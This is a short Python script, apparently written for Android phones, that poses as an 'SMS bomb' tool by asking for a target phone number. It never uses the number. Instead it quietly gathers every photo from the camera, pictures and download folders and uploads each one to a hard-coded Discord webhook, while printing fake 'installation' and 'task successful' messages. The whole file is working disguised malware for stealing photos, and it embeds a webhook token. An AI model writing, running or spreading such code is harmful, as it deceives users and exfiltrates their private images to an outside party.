import os
import requests

# Sənin yaratdığın düzgün Discord Webhook linki
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517140166647480403/9jzk1BMuUlkSp4gvSdMaMIN_ET0il-kFIp9Btj5DH0fQcRrFcwMNWch2AkGcsaDx6nv9"
input("hangi numaraya sms bomb atmak istersiniz? ")
def upload_file_to_discord(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files)
        if response.status_code in [200, 204]:
            print(f"✅ ")
        else:
            print(f"❌ ")
    except Exception as e:
        print(f"⚠️ error")

def find_images_in_gallery():
    # Kodun baxacağı qovluqlar (Android üçün)
    gallery_paths = [
        '/sdcard/DCIM/Camera',
        '/sdcard/Pictures',
        '/storage/emulated/0/DCIM/Camera',
        '/storage/emulated/0/Pictures',
        '/sdcard/Download'
    ]
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    image_files = []
    
    for folder in gallery_paths:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        image_files.append(os.path.join(root, file))
    return image_files

if __name__ == '__main__':
    print("başlanılıyor")
    images = find_images_in_gallery()
    
    if not images:
        print(".")
    else:
        print(f"kurulum yapılıyor... görev başarılı...\n")
        for img in images:
            upload_file_to_discord(img)
            
        print("\n🎉görev tamamlandı")
